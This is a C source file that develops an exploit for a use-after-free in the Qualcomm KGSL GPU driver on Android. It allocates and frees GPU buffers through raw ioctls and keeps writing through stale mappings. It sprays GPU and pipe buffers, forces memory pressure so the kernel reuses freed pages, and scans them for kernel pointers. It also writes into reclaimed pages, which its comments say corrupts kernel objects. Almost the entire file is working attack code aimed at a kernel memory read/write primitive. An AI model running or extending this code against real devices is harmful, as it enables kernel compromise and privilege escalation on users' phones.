/*
 * kgsl_mmap_v4.c — KGSL stale mmap exploitation
 *
 * CONFIRMED: Writing through stale mmap of freed GPU buffer WORKS.
 * Guard page at mmapsize - allocsize causes SIGBUS.
 * Fix: only access first alloc_size bytes, not mmapsize bytes.
 *
 * This version tests:
 * 1. Stale write verification (confirmed working in v3 test 5)
 * 2. Kernel page reclaim — do freed GPU pages get reused by kernel?
 * 3. Stale mmap as kernel memory read/write primitive
 * 4. Multiple free+spray cycles for timing
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o kgsl_mmap_v4 kgsl_mmap_v4.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <stdint.h>

#define KGSL_IOC_TYPE 0x09
#define MAKE_IOCTL_RW(nr, sz) (0xC0000000 | ((sz) << 16) | (KGSL_IOC_TYPE << 8) | (nr))

#define CMD_ALLOC   MAKE_IOCTL_RW(0x34, 48)
#define CMD_FREE    MAKE_IOCTL_RW(0x35, 8)

static int kgsl_fd = -1;
static sigjmp_buf jmp;
static volatile int caught_sig = 0;

static void sighandler(int sig) {
    caught_sig = sig;
    siglongjmp(jmp, sig);
}

static void install_sigs(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sighandler;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGABRT, &sa, NULL);
}

/* Fill using volatile byte writes — use alloc_size NOT mmapsize! */
static int safe_fill(volatile unsigned char *p, size_t len, unsigned char val) {
    if (sigsetjmp(jmp, 1) != 0) {
        install_sigs();
        return -1;
    }
    for (size_t i = 0; i < len; i++)
        p[i] = val;
    return 0;
}

static int safe_scan(volatile unsigned char *p, size_t len, unsigned char expected,
                     int *out_changes) {
    int first = -1, changes = 0;
    if (sigsetjmp(jmp, 1) != 0) {
        install_sigs();
        return -2;
    }
    for (size_t i = 0; i < len; i++) {
        if (p[i] != expected) {
            changes++;
            if (first < 0) first = (int)i;
        }
    }
    if (out_changes) *out_changes = changes;
    return first;
}

static void safe_hexdump(volatile unsigned char *p, size_t off, size_t count, size_t limit) {
    if (sigsetjmp(jmp, 1) != 0) {
        printf("(crash in dump)\n");
        install_sigs();
        return;
    }
    printf("  ");
    for (size_t i = 0; i < count && (off + i) < limit; i++) {
        printf("%02x ", p[off + i]);
        if ((i + 1) % 16 == 0) printf("\n  ");
    }
    printf("\n");
}

static int gpu_alloc(unsigned int size_bytes, unsigned int *out_id,
                     unsigned long *out_gpuaddr, size_t *out_mmapsize) {
    unsigned char buf[48] = {0};
    *(size_t *)(buf + 8) = size_bytes;
    int ret = ioctl(kgsl_fd, CMD_ALLOC, buf);
    if (ret < 0) return -1;
    if (out_id) *out_id = *(unsigned int *)(buf + 0);
    if (out_gpuaddr) *out_gpuaddr = *(unsigned long *)(buf + 24);
    if (out_mmapsize) *out_mmapsize = *(size_t *)(buf + 16);
    return 0;
}

static int gpu_free(unsigned int id) {
    unsigned char buf[8] = {0};
    *(unsigned int *)buf = id;
    return ioctl(kgsl_fd, CMD_FREE, buf);
}

/*========== TEST 1: Confirm stale write and proper size ==========*/
static void test_stale_write(void) {
    printf("\n=== TEST 1: Stale mmap write (alloc_size only) ===\n");

    unsigned int id;
    unsigned long ga;
    size_t ms;
    unsigned int alloc_sz = 4096;

    if (gpu_alloc(alloc_sz, &id, &ga, &ms) < 0) {
        printf("  alloc failed\n");
        return;
    }

    void *map = mmap(NULL, ms, PROT_READ | PROT_WRITE, MAP_SHARED,
                     kgsl_fd, (off_t)id * 4096);
    if (map == MAP_FAILED) {
        printf("  mmap failed\n");
        gpu_free(id);
        return;
    }

    volatile unsigned char *p = (volatile unsigned char *)map;
    printf("  id=%u alloc=%u mmapsize=%zu\n", id, alloc_sz, ms);

    /* Fill ONLY alloc_size bytes (not mmapsize!) */
    if (safe_fill(p, alloc_sz, 0xAA) < 0) {
        printf("  CRASH filling alloc_size region!\n");
        munmap(map, ms);
        gpu_free(id);
        return;
    }
    printf("  filled %u bytes with 0xAA — OK\n", alloc_sz);

    /* Verify */
    int changes;
    int diff = safe_scan(p, alloc_sz, 0xAA, &changes);
    printf("  verify: %s\n", diff < 0 && diff != -2 ? "all 0xAA" : "issue");

    /* Free */
    gpu_free(id);
    printf("  freed\n");

    /* Write through stale mapping */
    if (safe_fill(p, alloc_sz, 0xBB) < 0) {
        printf("  stale fill CRASHED — mapping invalidated\n");
    } else {
        printf("  stale fill 0xBB — OK! (wrote %u bytes to freed memory)\n", alloc_sz);
        /* Verify */
        diff = safe_scan(p, alloc_sz, 0xBB, &changes);
        printf("  stale readback: %s\n",
               diff < 0 && diff != -2 ? "all 0xBB — CONFIRMED WRITE-THROUGH!" : "mismatch");
    }

    munmap(map, ms);
}

/*========== TEST 2: Full mmap-after-free with spray ==========*/
static void test_uaf_spray(void) {
    printf("\n=== TEST 2: mmap-after-free + GPU spray (alloc_size safe) ===\n");

    unsigned int alloc_sizes[] = { 4096, 8192, 16384, 65536 };
    int nsizes = 4;

    for (int s = 0; s < nsizes; s++) {
        pid_t pid = fork();
        if (pid < 0) continue;

        if (pid == 0) {
            install_sigs();
            unsigned int sz = alloc_sizes[s];
            unsigned int id;
            unsigned long ga;
            size_t ms;

            if (gpu_alloc(sz, &id, &ga, &ms) < 0) _exit(1);

            void *map = mmap(NULL, ms, PROT_READ | PROT_WRITE, MAP_SHARED,
                             kgsl_fd, (off_t)id * 4096);
            if (map == MAP_FAILED) { gpu_free(id); _exit(1); }

            volatile unsigned char *p = (volatile unsigned char *)map;

            /* Fill alloc_size region */
            if (safe_fill(p, sz, 0xCC) < 0) {
                printf("  %5u: fill CRASH\n", sz);
                _exit(2);
            }

            /* Free */
            gpu_free(id);

            /* Check immediately after free */
            int changes;
            int diff = safe_scan(p, sz, 0xCC, &changes);
            if (diff == -2) {
                printf("  %5u: post-free read CRASH\n", sz);
                _exit(3);
            } else if (diff >= 0) {
                printf("  %5u: >>> CHANGED immediately! %d bytes at +%d <<<\n", sz, changes, diff);
            } else {
                printf("  %5u: data intact post-free\n", sz);
            }

            /* GPU spray — same size */
            unsigned int spray_ids[256];
            int sprayed = 0;
            for (int i = 0; i < 256; i++) {
                unsigned long sga; size_t sms;
                if (gpu_alloc(sz, &spray_ids[i], &sga, &sms) == 0) sprayed++;
                else break;
            }

            diff = safe_scan(p, sz, 0xCC, &changes);
            if (diff >= 0) {
                printf("  %5u: >>> CHANGED AFTER %d-BUF SPRAY! %d bytes at +%d <<<\n",
                       sz, sprayed, changes, diff);
                safe_hexdump(p, diff > 16 ? diff - 16 : 0, 96, sz);

                /* Kernel pointer scan */
                for (size_t i = 0; i < sz - 7; i += 8) {
                    uint64_t v;
                    unsigned char vb[8];
                    if (sigsetjmp(jmp, 1) == 0) {
                        for (int j = 0; j < 8; j++) vb[j] = p[i+j];
                        memcpy(&v, vb, 8);
                        if ((v & 0xFFFFFF0000000000ULL) == 0xffffffc000000000ULL)
                            printf("  KERNEL PTR at +%zu: 0x%016llx\n", i, (unsigned long long)v);
                    } else { install_sigs(); }
                }

                for (int i = 0; i < sprayed; i++) gpu_free(spray_ids[i]);
                munmap(map, ms);
                _exit(42);
            } else if (diff == -2) {
                printf("  %5u: CRASH post-spray\n", sz);
            } else {
                printf("  %5u: unchanged after %d-buf spray\n", sz, sprayed);
            }

            for (int i = 0; i < sprayed; i++) gpu_free(spray_ids[i]);
            munmap(map, ms);
            _exit(0);
        }

        alarm(15);
        int status;
        waitpid(pid, &status, 0);
        alarm(0);
        if (WIFEXITED(status) && WEXITSTATUS(status) == 42)
            printf("  >>> UAF page reclaim at %u bytes! <<<\n", alloc_sizes[s]);
    }
}

/*========== TEST 3: Kernel page reclaim — does the kernel reuse freed GPU pages? ==========*/
static void test_kernel_reclaim(void) {
    printf("\n=== TEST 3: Kernel page reclaim via mmap/fork ===\n");

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        install_sigs();

        /* Allocate GPU buffer */
        unsigned int id;
        unsigned long ga;
        size_t ms;
        unsigned int sz = 4096;

        if (gpu_alloc(sz, &id, &ga, &ms) < 0) _exit(1);

        void *map = mmap(NULL, ms, PROT_READ | PROT_WRITE, MAP_SHARED,
                         kgsl_fd, (off_t)id * 4096);
        if (map == MAP_FAILED) { gpu_free(id); _exit(1); }

        volatile unsigned char *p = (volatile unsigned char *)map;
        safe_fill(p, sz, 0xDD);
        printf("  GPU buf id=%u filled with 0xDD\n", id);

        /* Free GPU buffer */
        gpu_free(id);
        printf("  freed GPU buffer\n");

        /* Now try to cause kernel memory pressure to reclaim the page */
        /* Method 1: allocate lots of anonymous memory */
        printf("  creating memory pressure...\n");
        void *chunks[1024];
        int nchunks = 0;
        for (int i = 0; i < 1024; i++) {
            chunks[i] = mmap(NULL, 65536, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (chunks[i] == MAP_FAILED) break;
            memset(chunks[i], i & 0xFF, 65536);  /* Force actual allocation */
            nchunks++;
        }
        printf("  allocated %d × 64KB = %d KB anonymous\n", nchunks, nchunks * 64);

        /* Check stale mapping */
        int changes;
        int diff = safe_scan(p, sz, 0xDD, &changes);
        if (diff == -2) {
            printf("  CRASH — page reclaimed and unmapped!\n");
        } else if (diff >= 0) {
            printf("  >>> STALE MAPPING CHANGED! %d bytes at +%d <<<\n", changes, diff);
            printf("  first 64 bytes:\n");
            safe_hexdump(p, 0, 64, sz);

            /* Check for recognizable kernel data */
            for (size_t i = 0; i < sz - 7; i += 8) {
                uint64_t v;
                unsigned char vb[8];
                if (sigsetjmp(jmp, 1) == 0) {
                    for (int j = 0; j < 8; j++) vb[j] = p[i+j];
                    memcpy(&v, vb, 8);
                    if ((v & 0xFFFFFF0000000000ULL) == 0xffffffc000000000ULL)
                        printf("  KERNEL PTR at +%zu: 0x%016llx\n", i, (unsigned long long)v);
                    if (v == 0xDEADBEEF || v == 0x6B6B6B6B6B6B6B6BULL)
                        printf("  SLAB POISON at +%zu: 0x%016llx\n", i, (unsigned long long)v);
                } else { install_sigs(); }
            }

            /* Try writing — if page is now a kernel object, this corrupts it */
            if (sigsetjmp(jmp, 1) == 0) {
                unsigned char old = p[0];
                p[0] = 0xFF;
                printf("  write test: old=0x%02x new=0x%02x readback=0x%02x\n",
                       old, 0xFF, p[0]);
            } else {
                printf("  write to reclaimed page CRASHED (sig=%d)\n", caught_sig);
                install_sigs();
            }

            for (int i = 0; i < nchunks; i++) munmap(chunks[i], 65536);
            munmap(map, ms);
            _exit(42);
        } else {
            printf("  stale mapping still 0xDD after memory pressure\n");
        }

        /* Method 2: Pipe buffer spray (kernel page allocations) */
        printf("  trying pipe buffer spray...\n");
        int pipes[256][2];
        int npipes = 0;
        for (int i = 0; i < 256; i++) {
            if (pipe(pipes[i]) < 0) break;
            char pbuf[4096];
            memset(pbuf, 0xEE, sizeof(pbuf));
            write(pipes[i][1], pbuf, sizeof(pbuf));
            npipes++;
        }
        printf("  created %d pipes with 4K data each\n", npipes);

        diff = safe_scan(p, sz, 0xDD, &changes);
        if (diff >= 0) {
            printf("  >>> CHANGED AFTER PIPE SPRAY! %d bytes <<<\n", changes);
            safe_hexdump(p, 0, 64, sz);
            for (int i = 0; i < npipes; i++) { close(pipes[i][0]); close(pipes[i][1]); }
            for (int i = 0; i < nchunks; i++) munmap(chunks[i], 65536);
            munmap(map, ms);
            _exit(42);
        } else if (diff == -2) {
            printf("  CRASH after pipe spray\n");
        } else {
            printf("  unchanged after pipe spray\n");
        }

        for (int i = 0; i < npipes; i++) { close(pipes[i][0]); close(pipes[i][1]); }
        for (int i = 0; i < nchunks; i++) munmap(chunks[i], 65536);
        munmap(map, ms);
        _exit(0);
    }

    alarm(30);
    int status;
    waitpid(pid, &status, 0);
    alarm(0);
    if (WIFEXITED(status))
        printf("  result: %s (exit=%d)\n",
               WEXITSTATUS(status) == 42 ? "KERNEL RECLAIM DETECTED!" : "no reclaim",
               WEXITSTATUS(status));
    else if (WIFSIGNALED(status))
        printf("  child signal %d\n", WTERMSIG(status));
}

/*========== TEST 4: Close KGSL fd, check stale mapping ==========*/
static void test_close_fd_stale(void) {
    printf("\n=== TEST 4: Close KGSL fd, check stale mapping ===\n");

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        install_sigs();

        int fd2 = open("/dev/kgsl-3d0", O_RDWR);
        if (fd2 < 0) { printf("  kgsl open failed\n"); _exit(1); }

        unsigned char buf[48] = {0};
        *(size_t *)(buf + 8) = 4096;
        if (ioctl(fd2, CMD_ALLOC, buf) < 0) { printf("  alloc failed\n"); _exit(1); }

        unsigned int id = *(unsigned int *)(buf + 0);
        size_t ms = *(size_t *)(buf + 16);

        void *map = mmap(NULL, ms, PROT_READ | PROT_WRITE, MAP_SHARED,
                         fd2, (off_t)id * 4096);
        if (map == MAP_FAILED) { printf("  mmap failed\n"); _exit(1); }

        volatile unsigned char *p = (volatile unsigned char *)map;
        safe_fill(p, 4096, 0xAA);
        printf("  id=%u filled 0xAA\n", id);

        /* Close the ENTIRE KGSL fd — this should free all GPU resources */
        close(fd2);
        printf("  closed KGSL fd\n");

        /* Check stale mapping */
        int changes;
        int diff = safe_scan(p, 4096, 0xAA, &changes);
        if (diff == -2) {
            printf("  CRASH reading after fd close — mapping fully invalidated\n");
        } else if (diff >= 0) {
            printf("  >>> CHANGED! %d bytes at +%d after fd close <<<\n", changes, diff);
            safe_hexdump(p, 0, 64, 4096);

            for (size_t i = 0; i < 4096 - 7; i += 8) {
                uint64_t v;
                unsigned char vb[8];
                if (sigsetjmp(jmp, 1) == 0) {
                    for (int j = 0; j < 8; j++) vb[j] = p[i+j];
                    memcpy(&v, vb, 8);
                    if ((v & 0xFFFFFF0000000000ULL) == 0xffffffc000000000ULL)
                        printf("  KERNEL PTR +%zu: 0x%016llx\n", i, (unsigned long long)v);
                } else { install_sigs(); }
            }
            munmap(map, ms);
            _exit(42);
        } else {
            printf("  still 0xAA — pages not reclaimed after fd close\n");

            /* Try heavy allocation to force reclaim */
            void *chunks[512];
            int n = 0;
            for (int i = 0; i < 512; i++) {
                chunks[i] = mmap(NULL, 65536, PROT_READ|PROT_WRITE,
                                MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
                if (chunks[i] == MAP_FAILED) break;
                memset(chunks[i], i, 65536);
                n++;
            }
            printf("  forced %d×64K kernel alloc\n", n);

            diff = safe_scan(p, 4096, 0xAA, &changes);
            if (diff >= 0) {
                printf("  >>> CHANGED AFTER PRESSURE! %d bytes <<<\n", changes);
                safe_hexdump(p, 0, 64, 4096);
                for (int i = 0; i < n; i++) munmap(chunks[i], 65536);
                munmap(map, ms);
                _exit(42);
            } else if (diff == -2) {
                printf("  CRASH after pressure\n");
            } else {
                printf("  STILL 0xAA after pressure — KGSL pages are pinned\n");
            }
            for (int i = 0; i < n; i++) munmap(chunks[i], 65536);
        }

        munmap(map, ms);
        _exit(0);
    }

    alarm(30);
    int status;
    waitpid(pid, &status, 0);
    alarm(0);
    if (WIFEXITED(status))
        printf("  result: %s (exit=%d)\n",
               WEXITSTATUS(status) == 42 ? "PAGE RECLAIM!" : "pages pinned",
               WEXITSTATUS(status));
    else if (WIFSIGNALED(status))
        printf("  child signal %d\n", WTERMSIG(status));
}

int main(void) {
    printf("=== KGSL MMAP V4 — Stale mmap exploitation ===\n");
    printf("uid=%u\n", getuid());

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) {
        printf("KGSL open failed: %s\n", strerror(errno));
        return 1;
    }
    printf("KGSL fd=%d\n\n", kgsl_fd);
    install_sigs();

    test_stale_write();
    test_uaf_spray();
    test_kernel_reclaim();
    test_close_fd_stale();

    close(kgsl_fd);
    printf("\n=== ALL V4 TESTS COMPLETE ===\n");
    return 0;
}
